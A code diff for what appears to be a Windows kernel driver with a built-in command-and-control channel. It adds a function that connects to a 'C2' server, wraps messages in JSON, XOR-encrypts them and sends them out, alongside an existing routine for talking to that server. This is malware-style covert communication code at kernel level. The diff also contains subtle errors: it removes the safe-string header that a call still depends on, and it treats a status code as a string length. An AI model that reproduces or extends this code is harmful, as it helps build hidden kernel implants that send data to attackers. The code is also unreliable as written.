@@ -1,8 +1,9 @@
 #include <ntddk.h>
 #include <wsk.h>
-#include <ntstrsafe.h>
+
 #include <ip2string.h>
 #include "nn.h"
+#include "c2_comm.h"
 
 #define C2_SERVER_IP "127.0.0.1"
 #define C2_SERVER_PORT 443
@@ -283,9 +284,39 @@ NTSTATUS NeuralNetwork_CommunicateWithC2(NeuralNetwork* nn) {
         }
     }
 
+
+
+
 cleanup:
     if (Socket != NULL) {
         WskCloseSocket(Socket);
     }
     return status;
+}
+
+NTSTATUS SendDebugMessageToC2(const char* message) {
+    static BOOLEAN isConnected = FALSE;
+
+    if (!message) return STATUS_INVALID_PARAMETER;
+
+    if (!isConnected) {
+        NTSTATUS status = ConnectToC2Server();
+        if (!NT_SUCCESS(status)) return status;
+        isConnected = TRUE;
+    }
+
+    CHAR json_data[4096];
+    int len = RtlStringCchPrintfA(json_data, sizeof(json_data),
+        "{\"type\":\"debug_message\",\"payload\":{"
+        "\"timestamp\":%lld,"
+        "\"message\":\"%s\""
+        "}}",
+        KeQueryInterruptTime(),
+        message
+    );
+
+    if (len <= 0 || len >= sizeof(json_data)) return STATUS_BUFFER_OVERFLOW;
+
+    XorEncryptDecrypt((PUCHAR)json_data, len, EncryptionKey, sizeof(EncryptionKey));
+    return SendDataToC2((PUCHAR)json_data, len);
 }
